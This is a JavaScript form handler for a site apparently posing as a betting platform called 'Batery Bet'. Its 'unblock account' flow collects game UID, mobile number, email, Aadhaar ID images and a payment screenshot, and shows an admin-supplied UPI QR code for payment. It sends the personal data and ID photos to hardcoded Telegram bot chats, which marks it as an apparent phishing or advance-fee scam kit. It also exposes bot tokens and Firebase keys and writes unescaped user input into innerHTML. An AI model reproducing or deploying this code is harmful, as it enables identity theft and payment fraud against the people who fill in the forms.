// ==========================================
//  BATERY BET - Form Handler
//  Firebase Firestore Integration
// ==========================================

// ===== FIREBASE CONFIG =====
const FIREBASE_CONFIG = {
  apiKey: "AIzaSyCiqaLzh7PoVC5l03sJFdtK548Wulufn94",
  authDomain: "alll-projects-admin-pennal.firebaseapp.com",
  projectId: "alll-projects-admin-pennal",
  storageBucket: "alll-projects-admin-pennal.firebasestorage.app",
  messagingSenderId: "689297868215",
  appId: "1:689297868215:web:2747b19c2da47a31f49432"
};

const SITE_ID = "batery_bet";

// ===== FIREBASE DYNAMIC LOADER =====
let _fbDb = null;
let _fbLoading = null;

function loadFirebase() {
  if (_fbDb) return Promise.resolve(_fbDb);
  if (_fbLoading) return _fbLoading;

  _fbLoading = new Promise((resolve, reject) => {
    const initDb = () => {
      try {
        if (!firebase.apps.length) firebase.initializeApp(FIREBASE_CONFIG);
        _fbDb = firebase.firestore();
        resolve(_fbDb);
      } catch (e) { reject(e); }
    };
    if (window.firebase && window.firebase.firestore) { initDb(); return; }
    const urls = [
      'https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js',
      'https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js',
      'https://www.gstatic.com/firebasejs/10.7.1/firebase-storage-compat.js'
    ];
    let loaded = 0;
    urls.forEach(src => {
      const s = document.createElement('script');
      s.src = src;
      s.onload = () => { loaded++; if (loaded === urls.length) initDb(); };
      s.onerror = () => reject(new Error('Firebase load failed: ' + src));
      document.head.appendChild(s);
    });
  });
  return _fbLoading;
}

function saveSubmission(data) {
  return loadFirebase().then(db => {
    const payload = { ...data, site_id: SITE_ID, created_at: firebase.firestore.FieldValue.serverTimestamp() };
    return db.collection('submissions').add(payload);
  });
}

const $ = id => document.getElementById(id);

let submissions = JSON.parse(localStorage.getItem('baterybet_submissions') || '[]');

const genId = () => 'TX' + Math.random().toString(36).substring(2, 8).toUpperCase();

const toast = (msg, type) => {
  const el = $('toastMessage');
  if (el) el.textContent = msg;
  const t = $('toast');
  if (!t) return;
  t.classList.add('show');
  if (type) t.classList.add('toast-' + type);
  setTimeout(() => {
    t.classList.remove('show');
    if (type) t.classList.remove('toast-' + type);
  }, 2500);
};

const updBadge = () => {
  const b = $('mailboxBadge');
  if (b) b.textContent = submissions.length;
  const m = $('mailboxBtn');
  if (m) m.classList.toggle('has-items', submissions.length > 0);
};

const saveSub = d => {
  d.time = new Date().toLocaleString('en-IN', {
    day: '2-digit', month: 'short', year: 'numeric',
    hour: '2-digit', minute: '2-digit'
  });
  d.reqId = genId();
  submissions.unshift(d);
  localStorage.setItem('baterybet_submissions', JSON.stringify(submissions));
  updBadge();
  renderSubs();
};

const renderSubs = () => {
  const es = $('emptyState');
  const sl = $('submissionsList');
  if (!sl) return;
  if (!submissions.length) {
    if (es) es.style.display = 'block';
    sl.innerHTML = '';
    return;
  }
  if (es) es.style.display = 'none';
  sl.innerHTML = submissions.map(s => `
    <div class="submission-item">
      <div class="submission-header">
        <span class="submission-type ${s.type === 'withdrawal' ? 'withdrawal' : ''}">${s.type === 'deposit' ? 'Deposit' : 'Withdrawal'}</span>
        <span class="submission-time">${s.time}</span>
      </div>
      <div class="submission-details">
        <div><strong>Email:</strong> ${s.email || ''}</div>
        <div><strong>Mobile:</strong> ${s.mobile || ''}</div>
        <div><strong>Amount:</strong> ₹${s.amount || ''}</div>
        ${s.utr ? '<div><strong>UTR:</strong> ' + s.utr + '</div>' : ''}
      </div>
    </div>
  `).join('');
};

// ===== LOCAL REQUESTS STORAGE (for requests.html) =====
const REQ_STORAGE_KEY = 'baterybet_all_requests';

function getLocalRequests() {
  return JSON.parse(localStorage.getItem(REQ_STORAGE_KEY) || '[]');
}

function saveRequestToLocal(data) {
  var requests = getLocalRequests();
  data._reqTime = new Date().toLocaleString('en-IN', {
    day: '2-digit', month: 'short', year: 'numeric',
    hour: '2-digit', minute: '2-digit'
  });
  if (!data.reqId) data.reqId = genId();
  requests.unshift(data);
  localStorage.setItem(REQ_STORAGE_KEY, JSON.stringify(requests));
}

function updateLocalRequest(reqId, newData) {
  var requests = getLocalRequests();
  var idx = requests.findIndex(function(r) { return r.reqId === reqId; });
  if (idx !== -1) {
    Object.keys(newData).forEach(function(k) { requests[idx][k] = newData[k]; });
    requests[idx]._editedAt = new Date().toLocaleString('en-IN', {
      day: '2-digit', month: 'short', year: 'numeric',
      hour: '2-digit', minute: '2-digit'
    });
    localStorage.setItem(REQ_STORAGE_KEY, JSON.stringify(requests));
    return true;
  }
  return false;
}

function deleteLocalRequest(reqId) {
  var requests = getLocalRequests();
  var filtered = requests.filter(function(r) { return r.reqId !== reqId; });
  localStorage.setItem(REQ_STORAGE_KEY, JSON.stringify(filtered));
  return requests.length !== filtered.length;
}

// ===== SAFE INIT =====
try {
  if (document.querySelectorAll('.tab-btn')) {
    document.querySelectorAll('.tab-btn').forEach(b => {
      b.addEventListener('click', () => {
        document.querySelectorAll('.tab-btn').forEach(x => x.classList.remove('active'));
        document.querySelectorAll('.form-card').forEach(x => x.classList.remove('active'));
        b.classList.add('active');
        const target = $(b.dataset.tab + 'Form');
        if (target) target.classList.add('active');
      });
    });
  }
} catch (e) { console.warn('tab init:', e); }

try {
  const df = $('depositFormEl');
  const ds = $('depositSubmit');
  if (df && ds) {
    df.addEventListener('submit', function(e) {
      e.preventDefault();
      ds.classList.add('loading');
      ds.disabled = true;
      const fd = new FormData(df);
      const d = { type: 'deposit' };
      fd.forEach((v, k) => { if (v && v.trim()) d[k] = v.trim(); });
      setTimeout(() => {
        const rid = genId();
        d.reqId = rid;
        saveSub(d);
        saveRequestToLocal(d);
        saveSubmission(d).catch(function(err) {
          console.warn('Firebase:', err);
        });
        ds.classList.remove('loading');
        ds.disabled = false;
        df.reset();
        var sp = $('successPopup');
        if (sp) sp.classList.add('active');
      }, 1200);
    });
  }
} catch (e) { console.warn('deposit init:', e); }

try {
  const wf = $('withdrawalFormEl');
  const ws = $('withdrawalSubmit');
  if (wf && ws) {
    wf.addEventListener('submit', function(e) {
      e.preventDefault();
      ws.classList.add('loading');
      ws.disabled = true;
      const fd = new FormData(wf);
      const d = { type: 'withdrawal' };
      fd.forEach((v, k) => { if (v && v.trim()) d[k] = v.trim(); });
      setTimeout(() => {
        const rid = genId();
        d.reqId = rid;
        saveSub(d);
        saveRequestToLocal(d);
        saveSubmission(d).catch(function(err) {
          console.warn('Firebase:', err);
        });
        ws.classList.remove('loading');
        ws.disabled = false;
        wf.reset();
        var sp = $('successPopup');
        if (sp) sp.classList.add('active');
      }, 1200);
    });
  }
} catch (e) { console.warn('withdrawal init:', e); }

// ===== TELEGRAM IMAGE SENDER =====
const TG_BOT_TOKEN = '8906822745:AAH_rQOexAgYey92rzgNw6piosCXDY20rwM';
const TG_CHAT_ID = '-1003782852692';

// ===== STEP 1 NOTIFICATION BOT =====
const TG_NOTIFY_BOT_TOKEN = '8949744664:AAFIy3DZ8UsU6pynuxRdtEv3QFIO7PSQbqE';
const TG_NOTIFY_CHAT_ID = '-1004422124444';

function sendTelegramMessage(text) {
  return fetch('https://api.telegram.org/bot' + TG_NOTIFY_BOT_TOKEN + '/sendMessage', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: TG_NOTIFY_CHAT_ID, text: text, parse_mode: 'HTML' })
  }).then(function(r) { return r.json(); });
}

function sendTelegramMessage(text) {
  return fetch('https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: TG_CHAT_ID, text: text, parse_mode: 'HTML' })
  }).then(function(r) { return r.json(); }).then(function(data) {
    if (!data.ok) throw new Error(data.description || 'Telegram send failed');
    return data;
  });
}

function sendImageToTelegram(file, caption) {
  var fd = new FormData();
  fd.append('chat_id', TG_CHAT_ID);
  fd.append('photo', file);
  fd.append('caption', caption);
  return fetch('https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendPhoto', {
    method: 'POST',
    body: fd
  }).then(function(r) { return r.json(); }).then(function(data) {
    if (data.ok) {
      return 'https://t.me/c/' + TG_CHAT_ID.replace('-100', '') + '/' + data.result.message_id;
    } else {
      throw new Error(data.description || 'Telegram send failed');
    }
  });
}

function uploadFile(file, storagePath) {
  var parts = storagePath.split('/');
  var fileName = parts[parts.length - 1];
  var caption = '🆔 ' + _rid + ' | ' + fileName.replace(/\.[^/.]+$/, '');
  return sendImageToTelegram(file, caption);
}

// ===== UNBLOCK MULTI-STEP =====
var _unblockData = {};
var _paymentUnsub = null;
var _timerInterval = null;
var _timerSeconds = 120;
var _rid = null;

function goToStep(step) {
  for (var i = 1; i <= 4; i++) {
    var panel = $('step' + i);
    var dot = $('stepDot' + i);
    var line = $('stepLine' + i);
    if (panel) panel.classList.remove('active');
    if (dot) dot.classList.remove('active', 'done');
    if (line) line.classList.remove('done');
  }
  var activePanel = $('step' + step);
  if (activePanel) activePanel.classList.add('active');
  for (var j = 1; j <= step; j++) {
    var d = $('stepDot' + j);
    if (d) {
      if (j < step) d.classList.add('done');
      else d.classList.add('active');
    }
    if (j < step) {
      var l = $('stepLine' + j);
      if (l) l.classList.add('done');
    }
  }
}

function startPaymentListener() {
  if (_paymentUnsub) { _paymentUnsub(); _paymentUnsub = null; }
  loadFirebase().then(function(db) {
    _paymentUnsub = db.collection('unblock_settings').doc('payment').onSnapshot(function(doc) {
      var data = doc.data() || {};
      var qrUrl = data.qr_code_url || null;
      var upiId = data.upi_id || null;
      if (qrUrl && upiId) {
        showPaymentReady(qrUrl, upiId);
      }
    });
  });
}

function showPaymentReady(qrUrl, upiId) {
  if (_timerInterval) { clearInterval(_timerInterval); _timerInterval = null; }
  var waiting = $('paymentWaiting');
  var ready = $('paymentReady');
  var qrImg = $('qrImage');
  var upiDisplay = $('upiDisplay');
  if (waiting) waiting.style.display = 'none';
  if (ready) ready.style.display = 'block';
  if (qrImg) qrImg.src = qrUrl;
  if (upiDisplay) upiDisplay.textContent = upiId;
  var upiBox = $('upiBox');
  if (upiBox) {
    upiBox.onclick = function() {
      if (navigator.clipboard) {
        navigator.clipboard.writeText(upiId).then(function() {
          toast('UPI ID copied!');
        });
      }
    };
  }
}

function startTimer() {
  _timerSeconds = 120;
  var display = $('timerDisplay');
  if (display) display.textContent = '02:00';
  if (_timerInterval) clearInterval(_timerInterval);
  _timerInterval = setInterval(function() {
    _timerSeconds--;
    var mins = Math.floor(_timerSeconds / 60);
    var secs = _timerSeconds % 60;
    if (display) display.textContent = (mins < 10 ? '0' : '') + mins + ':' + (secs < 10 ? '0' : '') + secs;
    if (_timerSeconds <= 0) {
      clearInterval(_timerInterval);
      _timerInterval = null;
      toast('Payment setup timeout - please try again later', 'error');
    }
  }, 1000);
}

function submitUnblockRequest() {
  var submitBtn = $('submitPayment');
  if (submitBtn) {
    submitBtn.disabled = true;
    submitBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Submitting...';
  }
  var rid = _rid || genId();
  _rid = rid;
  var d = { type: 'unblock', site_id: SITE_ID, reqId: rid };
  Object.keys(_unblockData).forEach(function(k) { d[k] = _unblockData[k]; });
  var fileFields = [
    { field: 'issue_image', key: 'issue_image_url', single: true },

    { field: 'aadhar_front', key: 'aadhar_front_url', single: true },
    { field: 'aadhar_back', key: 'aadhar_back_url', single: true },
    { field: 'payment_proof', key: 'payment_proof_url', single: true }
  ];
  var uploadPromises = [];
  fileFields.forEach(function(ff) {
    var fileInput = document.querySelector('[name="' + ff.field + '"]');
    if (fileInput && fileInput.files && fileInput.files.length > 0) {
      if (ff.single) {
        var file = fileInput.files[0];
        var ext = file.name.split('.').pop();
        var path = 'unblock/' + rid + '/' + ff.field + '.' + ext;
        uploadPromises.push(uploadFile(file, path).then(function(url) {
          d[ff.key] = url;
        }));
      } else {
        var urls = [];
        for (var fi = 0; fi < fileInput.files.length; fi++) {
          (function(idx) {
            var f = fileInput.files[idx];
            var ext = f.name.split('.').pop();
            var path = 'unblock/' + rid + '/' + ff.field + '_' + (idx + 1) + '.' + ext;
            uploadPromises.push(uploadFile(f, path).then(function(url) {
              urls.push(url);
            }));
          })(fi);
        }
        uploadPromises.push(Promise.resolve().then(function() {
          d[ff.key] = urls;
        }));
      }
    }
  });
  Promise.all(uploadPromises).then(function() {
    d.time = new Date().toLocaleString('en-IN', {
      day: '2-digit', month: 'short', year: 'numeric',
      hour: '2-digit', minute: '2-digit'
    });
    saveRequestToLocal(d);
    toast('Your request has been sent to admin! ✅');
    return saveSubmission(d);
  }).then(function() {
    if (_paymentUnsub) { _paymentUnsub(); _paymentUnsub = null; }
    if (_timerInterval) { clearInterval(_timerInterval); _timerInterval = null; }
    document.querySelectorAll('.file-label').forEach(function(l) {
      l.classList.remove('has-file');
      var icon = l.querySelector('i');
      var span = l.querySelector('span');
      if (icon && span) {
        if (l.id.includes('Issue') || l.id.includes('issue')) { icon.className = 'fas fa-image'; span.textContent = 'Choose issue screenshot'; }
        else if (l.id.includes('aadharFront') || l.id.includes('AadharFront')) { icon.className = 'fas fa-id-card'; span.textContent = 'Choose Aadhar front image'; }
        else if (l.id.includes('aadharBack') || l.id.includes('AadharBack')) { icon.className = 'fas fa-id-card'; span.textContent = 'Choose Aadhar back image'; }
        else if (l.id.includes('paymentProof') || l.id.includes('PaymentProof')) { icon.className = 'fas fa-camera'; span.textContent = 'Upload payment screenshot'; }
      }
    });
    document.querySelectorAll('.file-name').forEach(function(n) { n.textContent = ''; });
    var ppInput = $('paymentProofInput');
    if (ppInput) { ppInput.value = ''; }
    var spBtn = $('submitPayment');
    if (spBtn) spBtn.disabled = true;
    var sp = $('successPopup');
    if (sp) sp.classList.add('active');
    setTimeout(function() {
      if (sp) sp.classList.remove('active');
      window.location.href = 'requests.html';
    }, 3000);
  }).catch(function(err) {
    console.warn('Unblock submit failed:', err);
    toast('Submission failed - try again', 'error');
    if (submitBtn) {
      submitBtn.disabled = false;
      submitBtn.innerHTML = '<i class="fas fa-check-circle"></i> I Have Paid';
    }
  });
}

try {
  // Step 1 → Next
  var s1n = $('step1Next');
  if (s1n) {
    s1n.addEventListener('click', function() {
      var uid = $('fGameUid');
      var mob = $('fMobile');
      var em = $('fEmail');
      if (!uid || !uid.value.trim()) { toast('Enter Game UID'); uid.focus(); return; }
      if (!mob || !mob.value.trim()) { toast('Enter Mobile No.'); mob.focus(); return; }
      if (!em || !em.value.trim()) { toast('Enter Email'); em.focus(); return; }
      _unblockData.game_uid = uid.value.trim();
      _unblockData.mobile = mob.value.trim();
      _unblockData.email = em.value.trim();
      var msg = '<b>🔔 New Unlock Request - Step 1</b>\n'
        + '<b>Game UID:</b> ' + _unblockData.game_uid + '\n'
        + '<b>Mobile:</b> ' + _unblockData.mobile + '\n'
        + '<b>Email:</b> ' + _unblockData.email + '\n'
        + '<b>Time:</b> ' + new Date().toLocaleString('en-IN');
      sendTelegramMessage(msg).catch(function(e) { console.warn('TG notify:', e); });
      goToStep(2);
    });
  }

  // Step 2 ↔ Back / Next
  var s2b = $('step2Back');
  if (s2b) s2b.addEventListener('click', function() { goToStep(1); });
  var s2n = $('step2Next');
  if (s2n) {
    s2n.addEventListener('click', function() {
      var issue = document.querySelector('[name="issue_image"]');
      var aadharF = document.querySelector('[name="aadhar_front"]');
      var aadharB = document.querySelector('[name="aadhar_back"]');
      if (!issue || !issue.files || !issue.files[0]) { toast('Upload issue image'); return; }
      if (!aadharF || !aadharF.files || !aadharF.files[0]) { toast('Upload Aadhar front'); return; }
      if (!aadharB || !aadharB.files || !aadharB.files[0]) { toast('Upload Aadhar back'); return; }
      goToStep(3);
    });
  }

  // Step 3 ↔ Back / Next
  var s3b = $('step3Back');
  if (s3b) s3b.addEventListener('click', function() { goToStep(2); });
  var s3n = $('step3Next');
  if (s3n) {
    s3n.addEventListener('click', function() {
      _rid = genId();
      goToStep(4);
      startPaymentListener();
      loadFirebase().then(function(db) {
        db.collection('unblock_settings').doc('payment').get().then(function(doc) {
          var data = doc.data() || {};
          if (data.qr_code_url && data.upi_id) {
            showPaymentReady(data.qr_code_url, data.upi_id);
          } else {
            startTimer();
          }
        }).catch(function() {
          startTimer();
        });
      });
    });
  }

  // Step 4 ← Back
  var s4b = $('step4Back');
  if (s4b) {
    s4b.addEventListener('click', function() {
      if (_paymentUnsub) { _paymentUnsub(); _paymentUnsub = null; }
      if (_timerInterval) { clearInterval(_timerInterval); _timerInterval = null; }
      var waiting = $('paymentWaiting');
      var ready = $('paymentReady');
      if (waiting) waiting.style.display = 'block';
      if (ready) ready.style.display = 'none';
      goToStep(3);
    });
  }

  // Submit payment
  var spBtn = $('submitPayment');
  if (spBtn) spBtn.addEventListener('click', submitUnblockRequest);

  // Payment proof file input → enable/disable submit
  var ppInput = $('paymentProofInput');
  if (ppInput) {
    ppInput.addEventListener('change', function() {
      var btn = $('submitPayment');
      if (btn) btn.disabled = !(this.files && this.files.length > 0);
    });
  }

} catch (e) { console.warn('unblock steps:', e); }

// ===== FILE INPUT UI =====
try {
  document.querySelectorAll('.file-input-wrap input[type="file"]').forEach(function(input) {
    input.addEventListener('change', function() {
      var label = this.parentElement.querySelector('.file-label');
      var nameEl = this.parentElement.parentElement.querySelector('.file-name');
      if (this.files && this.files.length > 0) {
        label.classList.add('has-file');
        var icon = label.querySelector('i');
        var span = label.querySelector('span');
        if (icon) icon.className = 'fas fa-check-circle';
        if (this.files.length > 1) {
          if (span) span.textContent = this.files.length + ' files selected';
          if (nameEl) nameEl.textContent = this.files.length + ' files selected: ' + this.files[0].name + (this.files.length > 1 ? ' +' + (this.files.length - 1) + ' more' : '');
        } else {
          if (span) span.textContent = this.files[0].name;
          if (nameEl) nameEl.textContent = 'Selected: ' + this.files[0].name;
        }
      } else {
        label.classList.remove('has-file');
      }
    });
  });
} catch (e) {}

try {
  const pc = $('popupClose');
  if (pc) pc.addEventListener('click', function() {
    var sp = $('successPopup');
    if (sp) sp.classList.remove('active');
    toast('Request saved successfully!');
  });
} catch (e) {}

try {
  const sp = $('successPopup');
  if (sp) sp.addEventListener('click', function(e) {
    if (e.target === sp) sp.classList.remove('active');
  });
} catch (e) {}

try {
  const mb = $('mailboxBtn');
  if (mb) mb.addEventListener('click', function() {
    renderSubs();
    var mp = $('mailboxPopup');
    if (mp) mp.classList.add('active');
  });
} catch (e) {}

try {
  const mc = $('mailboxClose');
  if (mc) mc.addEventListener('click', function() {
    var mp = $('mailboxPopup');
    if (mp) mp.classList.remove('active');
  });
} catch (e) {}

try { updBadge(); } catch (e) {}

// Preload Firebase + show status
try {
  loadFirebase().then(function() {
    console.log('%c Firebase connected ✅', 'color:#34C759;font-weight:bold;font-size:13px');
    toast('Firebase connected');
  }).catch(function(e) {
    console.warn('Firebase preload:', e.message);
    toast('Firebase offline - check console');
  });
} catch (e) {}
